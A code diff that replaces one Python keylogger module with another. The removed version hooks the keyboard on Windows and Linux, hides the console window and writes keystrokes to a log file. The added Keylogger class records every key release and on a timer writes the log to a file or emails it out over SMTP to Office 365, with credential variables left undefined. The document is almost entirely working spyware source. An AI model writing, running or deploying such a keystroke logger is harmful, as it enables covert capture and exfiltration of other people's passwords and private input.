@@ -1,134 +1,111 @@
-# Source used: https://www.geeksforgeeks.org/design-a-keylogger-in-python/
-
-# Python code for keylogger
-# to be used in linux
-import os
-import pyxhook
-from sys import platform
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol (gmail)
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Timer
+from datetime import datetime
 
 def run(**args):
-    if platform == "win32":
-        import random
+    keylogger = Keylogger(interval= 60, report_method="file")
+    keylogger.start()
 
-# for the keylogger in windows: https://www.geeksforgeeks.org/design-a-keylogger-in-python
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
 
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
 
-def run(*args):
-    print("[*] In module keylogger")
-    amountStrokes = random.randint(5, 50)
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-    if args[0] == "windows":
-        import win32api
-        import win32console
-        import win32gui
-        import pythoncom
-        import pyHook
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
 
-        win = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(win, 0)
+    def sendmail(self, email, password, message, verbose=1):
+        # manages a connection to an SMTP server
+        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message after preparation
+        server.sendmail(email, email, self.prepare_mail(message))
+        # terminates the session
+        server.quit()
+        if verbose:
+            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
 
-        def OnKeyboardEvent(event):
-            amountStrokes -= 1
-            if event.Ascii == 5:
-                exit(1)
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # if you don't want to print in the console, comment below line
+            print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
 
-            if event.Ascii != 0 or 8:
-                # open output.txt to read current keystrokes
-                f = open("./data/keylog.txt", "r+")
-                buffer = f.read()
-                f.close()
-                # open output.txt to write current + new keystrokes
-                f = open("./data/keylog.txt", "w")
-                keylogs = chr(event.Ascii)
-
-                if event.Ascii == 13:
-                    keylogs = "/n"
-                    buffer += keylogs
-                    f.write(buffer)
-                    f.close()
-
-            if amountStrokes == 0:
-                f = open("./data/keylog.txt", "r")
-                return f
-
-        # create a hook manager object
-        hm = pyHook.HookManager()
-        hm.KeyDown = OnKeyboardEvent
-
-        # set the hook
-        hm.HookKeyboard()
-
-        # wait forever
-        pythoncom.PumpMessages()
-
-    elif args[0] == "linux":
-        from pynput.keyboard import Key, Listener
-        import logging
-
-        logging.basicConfig(
-            filename="./data/keylog.txt", level=logging.DEBUG, format="key: %(message)s"
-        )
-
-        def on_press(key):
-            amountStrokes -= 1
-            logging.info(str(key))
-
-            if amountStrokes == 0:
-                f = open("./data/keylog.txt", "r")
-                return f
-
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-
-    elif args[0] == "macos":
-        return "the logger found macOS, logger not implemented"
-    else:
-        print("[*] keylogger")
-        # This tells the keylogger where the log file will go.
-        # You can set the file path as an environment variable ('pylogger_file'),
-        # or use the default ~/Desktop/file.log
-        log_file = os.environ.get(
-            'pylogger_file',
-            os.path.expanduser('~/Desktop/file.log')
-        )
-        # Allow setting the cancel key from environment args, Default: `
-        cancel_key = ord(
-            os.environ.get(
-                'pylogger_cancel',
-                '`'
-            )[0]
-        )
-
-        # Allow clearing the log file on start, if pylogger_clean is defined.
-        if os.environ.get('pylogger_clean', None) is not None:
-            try:
-                os.remove(log_file)
-            except EnvironmentError:
-            # File does not exist, or no permissions.
-                pass
-
-        #creating key pressing event and saving it into log file
-        def OnKeyPress(event):
-            with open(log_file, 'a') as f:
-                f.write('{}\n'.format(event.Key))
-
-        # create a hook manager object
-        new_hook = pyxhook.HookManager()
-        new_hook.KeyDown = OnKeyPress
-        # set the hook
-        new_hook.HookKeyboard()
-        try:
-            new_hook.start()         # start the hook
-        except KeyboardInterrupt:
-            # User cancelled from command line.
-            pass
-        except Exception as ex:
-            # Write exceptions to the log file, for analysis later.
-            msg = 'Error while catching events:\n  {}'.format(ex)
-            pyxhook.print_err(msg)
-            with open(log_file, 'a') as f:
-                f.write('\n{}'.format(msg))
-
-        with open(log_file, 'r') as f:
-            log = f.read()
-        return log
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
